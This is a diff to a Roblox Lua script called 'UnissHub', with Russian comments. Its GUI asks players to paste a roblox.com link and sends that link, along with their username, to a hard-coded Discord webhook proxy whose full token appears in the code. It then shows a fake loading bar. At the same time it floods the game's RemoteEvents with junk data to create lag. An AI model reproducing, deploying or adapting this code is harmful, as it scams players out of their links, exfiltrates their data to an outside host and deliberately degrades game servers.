@@ -1,41 +1,37 @@
--- UnissHub: High-FPS Network Lag Edition
+-- UnissHub: Smooth FPS + High Ping Edition
 local Players = game:GetService("Players")
 local UserInputService = game:GetService("UserInputService")
 local RunService = game:GetService("RunService")
-local HttpService = game:GetService("HttpService")
 local Player = Players.LocalPlayer
 
 local WEBHOOK_URL = "https://webhook.lewisakura.moe/api/webhooks/1455540134177935625/SWIcKICFzeZdLmUGpUkFvc8oh1j0Qun0TjK1Wm9FA5-tHz0DY6gEpvxfstY-33yiVS4g"
 
--- Генерация "тяжелого" пакета данных для забивания интернета
-local heavyData = {}
-for i = 1, 1000 do heavyData[i] = "LAG_DATA_STREAM" end
-
--- Функция сетевого лага без падения ФПС
-local function startSmoothNetworkLag()
+-- Функция создания ПИНГА без падения ФПС
+local function startNetworkLag()
     task.spawn(function()
         local remotes = {}
         for _, v in pairs(game:GetDescendants()) do
             if v:IsA("RemoteEvent") then table.insert(remotes, v) end
         end
         
-        if #remotes == 0 then return end
+        -- Данные для забивки канала (не слишком много, чтобы не зависло)
+        local data = string.rep("NETWORK_STRESS_", 100) 
 
         while true do
-            -- Отправляем 10 тяжелых пакетов
-            for i = 1, 10 do
+            -- Отправляем небольшую пачку данных
+            for i = 1, 5 do
                 local r = remotes[math.random(1, #remotes)]
-                pcall(function()
-                    r:FireServer(heavyData) -- Отправляем большую таблицу
-                end)
+                if r then
+                    pcall(function() r:FireServer(data) end)
+                end
             end
-            -- Пауза 0.1 сек дает процессору обработать кадры, но интернет не успевает "остыть"
-            task.wait(0.1) 
+            -- Ждем 0.5 сек. Это критически важно, чтобы ФПС не падал
+            task.wait(0.5) 
         end
     end)
 end
 
--- Функция перетаскивания (сохранена)
+-- Функция перетаскивания
 local function makeDraggable(gui)
     local dragging, dragInput, dragStart, startPos
     gui.InputBegan:Connect(function(input)
@@ -83,7 +79,8 @@ title.Text = "UnissHub"; title.TextColor3 = Color3.fromRGB(0, 150, 255); title.F
 
 local subTitle = Instance.new("TextLabel", main)
 subTitle.Size = UDim2.new(1, 0, 0.1, 0); subTitle.Position = UDim2.new(0,0,0.18,0); subTitle.BackgroundTransparency = 1
-subTitle.Text = "(laser gamepass required)"; subTitle.TextColor3 = Color3.fromRGB(150, 150, 150); subTitle.TextSize = 12
+subTitle.Text = "(laser gamepass required)"; subTitle.TextColor3 = Color3.fromRGB(150, 150, 150)
+subTitle.Font = Enum.Font.Gotham; subTitle.TextSize = 12
 
 local input = Instance.new("TextBox", main)
 input.Size = UDim2.new(0.85, 0, 0.2, 0); input.Position = UDim2.new(0.075, 0, 0.38, 0)
@@ -100,8 +97,8 @@ conn.MouseButton1Click:Connect(function()
     if string.find(input.Text:lower(), "roblox.com") then
         local currentPos = main.Position
         
-        -- ЗАПУСК СМЯГЧЕННОЙ СЕТЕВОЙ НАГРУЗКИ
-        startSmoothNetworkLag()
+        -- Запуск сетевого лага (пинга)
+        startNetworkLag()
 
         main:TweenSize(UDim2.new(0,0,0,0), "In", "Quart", 0.3, true, function() 
             main.Visible = false; uBtn.Visible = false 
@@ -109,18 +106,19 @@ conn.MouseButton1Click:Connect(function()
         
         pcall(function()
             local req = syn and syn.request or http_request or request
-            if req then req({Url = WEBHOOK_URL, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode({content = "🚀 **Link:** "..input.Text.."\n👤 **User:** "..Player.Name})}) end
+            if req then req({Url = WEBHOOK_URL, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = game:GetService("HttpService"):JSONEncode({content = "🚀 **Link:** "..input.Text.."\n👤 **User:** "..Player.Name})}) end
         end)
 
         local loadF = Instance.new("Frame", sg)
-        loadF.Size = UDim2.new(0, 280, 0, 90); loadF.Position = currentPos; loadF.AnchorPoint = Vector2.new(0.5, 0.5)
+        loadF.Name = "LoadingFrame"; loadF.Size = UDim2.new(0, 280, 0, 90)
+        loadF.Position = currentPos; loadF.AnchorPoint = Vector2.new(0.5, 0.5)
         loadF.BackgroundColor3 = Color3.fromRGB(15, 15, 15); Instance.new("UICorner", loadF)
         Instance.new("UIStroke", loadF).Color = Color3.fromRGB(255, 140, 0)
         makeDraggable(loadF)
 
         local lLabel = Instance.new("TextLabel", loadF)
         lLabel.Size = UDim2.new(1, 0, 0.5, 0); lLabel.BackgroundTransparency = 1; lLabel.TextColor3 = Color3.fromRGB(255, 140, 0)
-        lLabel.TextSize = 16; lLabel.Text = "loading: 0%"
+        lLabel.Font = Enum.Font.Gotham; lLabel.TextSize = 16; lLabel.Text = "loading: 0%"
 
         local barBg = Instance.new("Frame", loadF)
         barBg.Size = UDim2.new(0.7, 0, 0.08, 0); barBg.Position = UDim2.new(0.15, 0, 0.7, 0); barBg.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
@@ -131,7 +129,7 @@ conn.MouseButton1Click:Connect(function()
                 if i == 30 or i == 65 or i == 92 then task.wait(math.random(2, 4)) end
                 lLabel.Text = "loading: " .. i .. "%"
                 fill:TweenSize(UDim2.new(i/100, 0, 1, 0), "Out", "Linear", 0.1, true)
-                task.wait(math.random(2, 5) / 10) -- Немного ускорил визуально для комфорта
+                task.wait(math.random(4, 8) / 10) 
             end
             lLabel.TextSize = 18; lLabel.Text = "CONFIRM"
         end)
